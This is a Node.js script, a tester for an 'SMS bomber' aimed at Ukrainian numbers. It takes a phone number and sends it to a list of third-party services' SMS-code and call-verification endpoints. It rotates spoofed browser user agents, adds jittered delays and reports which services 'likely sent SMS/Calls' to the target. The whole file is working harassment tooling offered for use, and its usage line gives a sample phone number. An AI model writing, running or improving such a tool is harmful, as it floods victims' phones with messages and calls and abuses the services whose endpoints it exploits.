import axios from 'axios';
import chalk from 'chalk';
import { verifiedServices, buildRequest, formatPhone } from './verified-services.js';

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1"
];

async function testService(service, phone) {
  const req = buildRequest(service, phone);
  
  const config = {
    method: req.method.toLowerCase(),
    url: req.url,
    headers: {
      ...req.headers,
      'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
      'Accept': '*/*',
      'Accept-Language': 'uk-UA,uk;q=0.9,en;q=0.8'
    },
    timeout: 15000,
    validateStatus: () => true
  };
  
  if (req.body) {
    if (typeof req.body === 'string') {
      config.data = req.body;
    } else {
      config.data = req.body;
    }
  }
  
  try {
    const start = Date.now();
    const response = await axios(config);
    const duration = Date.now() - start;
    
    const success = response.status >= 200 && response.status < 300;
    const mayWork = response.status < 500;
    
    return {
      service: service.name,
      category: service.category,
      type: service.type || 'sms',
      status: response.status,
      success,
      mayWork,
      duration,
      response: JSON.stringify(response.data).substring(0, 200)
    };
  } catch (error) {
    return {
      service: service.name,
      category: service.category,
      type: service.type || 'sms',
      status: 0,
      success: false,
      mayWork: false,
      error: error.message
    };
  }
}

async function main() {
  const phone = process.argv[2];
  
  if (!phone) {
    console.log(chalk.red('Usage: node test-verified.js <phone>'));
    console.log(chalk.gray('Example: node test-verified.js 380506648076'));
    process.exit(1);
  }
  
  console.log(chalk.cyan('\n╔════════════════════════════════════════════════════════════════╗'));
  console.log(chalk.cyan('║') + chalk.yellow.bold('     VERIFIED SMS BOMBER TEST - UKRAINE                        ') + chalk.cyan('║'));
  console.log(chalk.cyan('╚════════════════════════════════════════════════════════════════╝\n'));
  
  console.log(chalk.white('Phone: ') + chalk.green('+' + formatPhone(phone, 'international')));
  console.log(chalk.white('Services: ') + chalk.green(verifiedServices.length));
  console.log(chalk.white('SMS services: ') + chalk.green(verifiedServices.filter(s => !s.type || s.type === 'sms').length));
  console.log(chalk.white('Call services: ') + chalk.green(verifiedServices.filter(s => s.type === 'call').length));
  console.log('');
  
  const results = { sent: [], failed: [], errors: [] };
  
  for (const service of verifiedServices) {
    process.stdout.write(chalk.gray(`Testing ${service.name.padEnd(25)}... `));
    
    const result = await testService(service, phone);
    
    if (result.success) {
      console.log(chalk.green(`✓ ${result.status} (${result.duration}ms)`));
      results.sent.push(result);
    } else if (result.mayWork) {
      console.log(chalk.yellow(`? ${result.status} (${result.duration}ms)`));
      results.failed.push(result);
    } else if (result.error) {
      console.log(chalk.red(`✗ ${result.error.substring(0, 40)}`));
      results.errors.push(result);
    } else {
      console.log(chalk.red(`✗ ${result.status}`));
      results.failed.push(result);
    }
    
    await sleep(500 + Math.random() * 500);
  }
  
  console.log(chalk.cyan('\n════════════════════════════════════════════════════════════════\n'));
  console.log(chalk.green(`Likely sent SMS/Calls: ${results.sent.length}`));
  console.log(chalk.yellow(`Uncertain (4xx): ${results.failed.length}`));
  console.log(chalk.red(`Errors: ${results.errors.length}`));
  
  if (results.sent.length > 0) {
    console.log(chalk.cyan('\n─── Successful Services ───────────────────────────────────────\n'));
    for (const r of results.sent) {
      const type = r.type === 'call' ? chalk.magenta('[CALL]') : chalk.blue('[SMS]');
      console.log(`${type} ${chalk.green(r.service)} - ${r.status} (${r.duration}ms)`);
    }
  }
  
  console.log(chalk.cyan('\n─── Check your phone for incoming messages! ───────────────────\n'));
}

main().catch(console.error);
